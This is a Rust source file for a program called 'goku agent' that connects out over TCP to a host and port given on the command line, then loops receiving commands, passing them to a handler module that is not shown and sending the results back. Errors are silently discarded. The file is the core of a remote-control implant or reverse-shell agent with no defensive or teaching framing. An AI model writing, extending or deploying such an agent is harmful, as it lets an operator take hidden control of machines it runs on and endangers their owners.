extern crate agent_commands;


use rand::Rng;
use std::net::{TcpStream};
use std::io::{Write, Read};
use std::{thread, time};
use uuid::Uuid;
use std::env;
use clap::{Arg, App, SubCommand, crate_authors, crate_description, crate_name, crate_version};
use agent_commands::*;


mod command;

fn main() {
    let matches = App::new("goku agent")
                        .arg(Arg::with_name("port")
                            .short("p")
                            .long("port")
                            .help("the remote port")
                            .required(true)
                            .takes_value(true)
                        )
                        .arg(Arg::with_name("url-ip")
                            .short("u")
                            .long("url")
                            .help("the remote url/ip")
                            .required(true)
                            .takes_value(true)
                        )           
                        .get_matches();


    let port: String = matches.value_of("port").unwrap().to_string();
    let ip: String = matches.value_of("url-ip").unwrap().to_string();

    println!("ka - me - ha - me - haaa");

    let server_address = [ip.clone(), port.clone()].join(":");

    match TcpStream::connect(server_address.clone()) {
        Ok(mut stream) => {
            exchange_with_server(stream);
        }
        Err(e) => {
            //println!("Connection refused from the server");
            //println!("{:#?}", e);
        }
    };
}

fn exchange_with_server(mut stream: TcpStream) {
    //let mut buf = [0; 256];
    loop {
        let mut buf = [0; 4096];
        match stream.read(&mut buf) {
            Ok(received) => {
                if received < 1 {
                    // connection lost
                    return;
                }
            }
            Err(_) => {
                // connection lost
                return;
            }
        };
        let buf_str: String = String::from_utf8_lossy(&buf[..]).to_string();
        let buf_str: String = buf_str.trim_matches(char::from(0)).to_string();
        //println!("{:#?}", buf_str);
        
        let r = command::handler::process_cmd(buf_str);

        match stream.write_all(r.as_bytes()) {
            Ok(_) => {},
            Err(_) => {},
        };

        //clear_tcp_info(agent_com.clone());
    }
        
}





